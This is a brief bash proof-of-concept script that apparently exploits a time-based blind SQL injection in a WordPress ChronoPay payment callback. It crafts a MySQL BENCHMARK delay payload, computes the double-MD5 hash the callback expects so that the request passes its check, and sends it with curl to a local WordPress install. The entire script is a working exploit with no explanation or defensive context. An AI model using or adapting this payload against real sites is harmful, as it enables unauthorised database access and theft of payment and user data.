#!/bin/bash
payload="-1 AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)#"
hash=`echo -n $payload | openssl md5 | tr -d '\n' | sed 's/\s*-\s*//g' | openssl md5 | tr -d '\n' | sed 's/\s*-\s*//g'`
curl --data "cs2=chronopay&cs1=$payload&cs3=$hash&transaction_type=rebill" "http://localhost/wp38/?chronopay_callback=true"
